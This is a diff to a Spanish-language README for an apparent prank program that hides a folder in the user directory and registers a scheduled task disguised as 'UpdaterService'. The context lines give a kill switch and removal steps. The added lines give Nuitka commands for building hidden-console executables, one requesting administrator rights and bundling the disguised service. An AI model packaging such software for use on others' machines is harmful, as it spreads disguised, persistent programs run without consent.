@@ -6,3 +6,9 @@ Quienes lo descargen serán responsables de lo que hagan con el.
 El programa se detendrá al crear un txt llamado byefrog en el directorio usuario. 
 Para eliminarlo definitivamente hay que acceder al programador de tareas y borrar la tarea programada llamada UpdaterService, 
 también buscar la carpeta oculta en el directorio usuario llamada ansel y eliminarla.
+
+Para convertir los .py a ejecutables se recomienda seguir los siguientes pasos:
+- Abrir un terminal e instalar el compilador nuikta si no se tiene ya descargado.
+- Dirigirse al directorio donde se hayan los .py, la foto y el audio.
+- Ejecuta: nuitka --standalone --onefile --windows-disable-console UpdaterService.py
+- Ejecuta: nuitka --standalone --onefile --windows-uac-admin --windows-disable-console bromita.py --include-data-file=UpdaterService.exe=UpdaterService.exe --include-data-file=frog.jpg=frog.jpg --include-data-file=frog.mp3=frog.mp3
